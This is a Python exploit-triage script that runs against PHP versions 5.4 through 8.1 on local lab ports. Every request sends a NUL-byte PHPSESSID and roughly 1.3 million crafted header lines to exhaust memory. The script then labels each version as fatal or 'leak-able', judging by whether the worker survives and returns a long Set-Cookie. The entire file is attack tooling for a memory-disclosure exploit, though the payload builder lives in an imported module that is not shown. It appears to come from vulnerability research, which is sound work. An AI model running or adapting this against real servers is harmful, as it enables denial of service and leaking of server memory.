#!/usr/bin/env python3
"""Triage all sub-8.3 versions: does the NUL-byte arm OOM soft-bailout
(worker survives -> leak-able) or hard-fatal (worker dies -> blocked)?

Send PHPSESSID=\x00 + N 'a:\n' headers; inspect the response:
  - body contains 'Fatal error'/'Allowed memory size' -> HARD FATAL (blocked)
  - clean 200 + long Set-Cookie -> SOFT BAILOUT / LEAK
  - clean 200 + short/absent Set-Cookie -> soft but no leak yet (needs consumer)
"""
import sys, os, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php72"))
import drive as D

VERS = [
    ("8.1.32", 18110), ("8.0.30", 18109), ("7.4.33", 18108),
    ("7.3.33", 18107), ("7.2.34", 18106), ("7.1.33", 18105),
    ("7.0.33", 18104), ("5.6.40", 18103), ("5.5.38", 18102),
    ("5.4.45", 18101),
]
NH = 1299780   # dinosn 7.2 arm size

def analyze(port, nh):
    try:
        c = D.Conn("127.0.0.1", port, False, timeout=180)
    except Exception as e:
        return "conn-fail %r" % (e,)
    try:
        body = D.arm_body(nh, b"a:\n", b"\x00")
        r = c.post("/index.php", body, False, maxread=65536)
        sc = r["headers"].get("set-cookie", "")
        b = r["body"]
        hard = (b"Allowed memory size" in b) or (b"Fatal error" in b) or (b"Segmentation" in b)
        verdict = "HARD-FATAL" if hard else ("SOFT+LEAK" if len(sc) > 100 else "SOFT(no-leak)")
        return {"status": r["status"], "ttfb": r["ttfb"], "cookie": len(sc),
                "bodylen": len(b), "verdict": verdict,
                "bodyhead": b[:80].decode("latin-1", "replace")}
    except Exception as e:
        return "post-fail %r" % (e,)
    finally:
        c.close()

for ver, port in VERS:
    r = analyze(port, NH)
    if isinstance(r, str):
        print("%-7s %s" % (ver, r), flush=True)
    else:
        print("%-7s %-22s status=%-16s ttfb=%-7s cookie=%-6d bodylen=%-8d %s"
              % (ver, r["verdict"], r["status"], r["ttfb"], r["cookie"],
                 r["bodylen"], r["bodyhead"][:50]), flush=True)
    time.sleep(1.0)
print("DONE")
